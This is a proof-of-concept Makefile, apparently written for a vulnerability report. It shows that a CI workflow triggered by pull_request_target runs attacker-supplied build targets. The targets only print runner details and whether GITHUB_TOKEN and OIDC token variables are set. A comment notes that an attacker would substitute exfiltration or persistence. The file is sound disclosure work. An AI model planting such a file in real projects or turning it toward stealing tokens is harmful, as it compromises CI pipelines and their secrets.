# PoC Makefile — proves arbitrary code execution via pull_request_target
# This replaces the legitimate Makefile in the attacker's fork.
# When the CI workflow checks out the PR head and runs `make check`,
# this code executes instead of the real build targets.
#
# IMPORTANT: This PoC is non-destructive. It only prints environment
# info to the workflow logs to prove code execution occurred.

.PHONY: check format test sync venv

# ---- Proof of Concept markers ----
# Each target prints a unique marker + non-sensitive env info.
# An attacker would replace these with exfiltration or persistence.

check:
	@echo "=========================================="
	@echo "  POC: ARBITRARY CODE EXECUTION CONFIRMED"
	@echo "=========================================="
	@echo ""
	@echo "[*] Target: make check"
	@echo "[*] Runner OS: $$(uname -s) $$(uname -m)"
	@echo "[*] Hostname: $$(hostname)"
	@echo "[*] Whoami: $$(whoami)"
	@echo "[*] Working directory: $$(pwd)"
	@echo "[*] GitHub Actor: $${GITHUB_ACTOR}"
	@echo "[*] GitHub Repository: $${GITHUB_REPOSITORY}"
	@echo "[*] GitHub Event: $${GITHUB_EVENT_NAME}"
	@echo "[*] GitHub Run ID: $${GITHUB_RUN_ID}"
	@echo "[*] Runner Name: $${RUNNER_NAME}"
	@echo ""
	@echo "[*] Proving OIDC token endpoint is accessible:"
	@echo "    ACTIONS_ID_TOKEN_REQUEST_URL is set: $$([ -n \"$${ACTIONS_ID_TOKEN_REQUEST_URL}\" ] && echo YES || echo NO)"
	@echo "    ACTIONS_ID_TOKEN_REQUEST_TOKEN is set: $$([ -n \"$${ACTIONS_ID_TOKEN_REQUEST_TOKEN}\" ] && echo YES || echo NO)"
	@echo ""
	@echo "[*] Proving GITHUB_TOKEN is accessible:"
	@echo "    GITHUB_TOKEN is set: $$([ -n \"$${GITHUB_TOKEN}\" ] && echo YES || echo NO)"
	@echo ""
	@echo "[*] Network access test (DNS only, no exfil):"
	@nslookup github.com 2>/dev/null | head -3 || echo "    nslookup not available"
	@echo ""
	@echo "=========================================="
	@echo "  END OF POC — NO DESTRUCTIVE ACTION TAKEN"
	@echo "=========================================="

format:
	@echo "[POC] make format — code execution confirmed (GITHUB_RUN_ID=$${GITHUB_RUN_ID})"

test:
	@echo "[POC] make test — code execution confirmed (GITHUB_RUN_ID=$${GITHUB_RUN_ID})"

# Keep these so the workflow doesn't fail on other targets
sync:
	@echo "[POC] make sync called"

venv:
	@echo "[POC] make venv called"
